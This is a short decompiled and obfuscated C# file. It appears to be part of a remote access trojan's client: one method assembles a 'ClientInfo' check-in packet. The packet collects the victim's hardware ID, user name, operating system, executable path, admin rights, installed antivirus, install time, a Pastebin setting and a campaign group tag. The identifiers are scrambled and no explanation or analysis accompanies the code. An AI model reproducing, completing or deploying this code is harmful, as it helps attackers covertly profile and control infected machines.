using System;
using System.IO;
using System.Windows.Forms;
using FLyjDGiQaWOL;
using Microsoft.VisualBasic.Devices;
using MlfWmjHrDtM;

namespace TSsgkAiksqQbUk;

public static class lWQQXQrLBQgaqZs
{
	public static byte[] bvzkrhtFwuvD()
	{
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		BkiLYFLOLaOffh bkiLYFLOLaOffh = new BkiLYFLOLaOffh();
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Packet").NeEjgBfTnxsVX = "ClientInfo";
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("HWID").NeEjgBfTnxsVX = slKZMvijUhIUq.XzgMNqxRIl;
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("User").NeEjgBfTnxsVX = Environment.UserName.ToString();
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("OS").NeEjgBfTnxsVX = new ComputerInfo().get_OSFullName().ToString().Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Path").NeEjgBfTnxsVX = Application.get_ExecutablePath();
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Version").NeEjgBfTnxsVX = slKZMvijUhIUq.NtMonVRdvwx;
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Admin").NeEjgBfTnxsVX = gUNCcShyznD.dLtQcTradTu().ToString().ToLower()
			.Replace("true", "Admin")
			.Replace("false", "User");
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Performance").NeEjgBfTnxsVX = gUNCcShyznD.OpTBxCuTDqyveqbmB();
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Pastebin").NeEjgBfTnxsVX = slKZMvijUhIUq.fwPxvYZvAu;
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Antivirus").NeEjgBfTnxsVX = gUNCcShyznD.ososbTWhuCkBEG();
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Installed").NeEjgBfTnxsVX = new FileInfo(Application.get_ExecutablePath()).LastWriteTime.ToUniversalTime().ToString();
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Pong").NeEjgBfTnxsVX = "";
		bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Group").NeEjgBfTnxsVX = slKZMvijUhIUq.ARsJuxbQIiTOA;
		return bkiLYFLOLaOffh.nBhKSGjtanPwf();
	}
}
